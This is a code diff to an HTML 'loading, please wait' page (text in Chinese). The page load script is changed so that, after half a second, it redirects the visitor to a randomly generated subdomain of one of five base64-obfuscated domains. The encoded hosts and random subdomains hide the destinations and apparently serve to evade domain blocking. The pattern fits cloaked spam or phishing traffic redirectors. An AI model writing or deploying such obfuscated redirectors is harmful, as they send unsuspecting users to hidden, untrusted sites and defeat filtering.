@@ -82,27 +82,39 @@
             <p class="text-gray-500 text-center">系统正在加载页面，请稍候...</p>
         </div>
     </div>
-    <script>
-        window.onload = function() {
-            const delayTime = 500; // 延时（毫秒）
-            const encryptedProtocol = 'aHR0cHM6Ly8=';
-            //const encryptedRootDomain = 'LjMwMzAwMi54eXo=';
-            const encryptedRootDomain = 'LjMwMzAwMDEueHl6';
-            
-            function getRandomString() {
-                const chars = 'abcdefghijklmnopqrstuvwxyz';
-                let result = '';
-                const length = Math.floor(Math.random() * 4) + 3;
-                for (let i = 0; i < length; i++) {
-                    result += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-                return result;
+<script>
+    window.onload = function() {
+        const delayTime = 500; // 延时（毫秒）
+        const encryptedProtocol = 'aHR0cHM6Ly8=';
+        
+        const encryptedRootDomains = [
+            'LjMwMzAwMDIueHl6', 
+            'LnlpY3Vuby5vcmc=', 
+            'LmFnMjcuc3RvcmU=',
+            'LmFnMzcuc3RvcmU=', 
+            'LmY2OGpmaC5zdG9yZQ=='
+        ];
+        
+        function getRandomString() {
+            const chars = 'abcdefghijklmnopqrstuvwxyz';
+            let result = '';
+            const length = Math.floor(Math.random() * 4) + 3;
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
             }
-            
-            setTimeout(function() {
-                window.location.href = atob(encryptedProtocol) + getRandomString() + atob(encryptedRootDomain);
-            }, delayTime);
-        };
-    </script>
+            return result;
+        }
+
+        function getRandomRootDomain() {
+            const randomIndex = Math.floor(Math.random() * encryptedRootDomains.length);
+            return encryptedRootDomains[randomIndex];
+        }
+        
+        setTimeout(function() {
+            const randomRootDomain = getRandomRootDomain();
+            window.location.href = atob(encryptedProtocol) + getRandomString() + atob(randomRootDomain);
+        }, delayTime);
+    };
+</script>
 </body>
 </html>
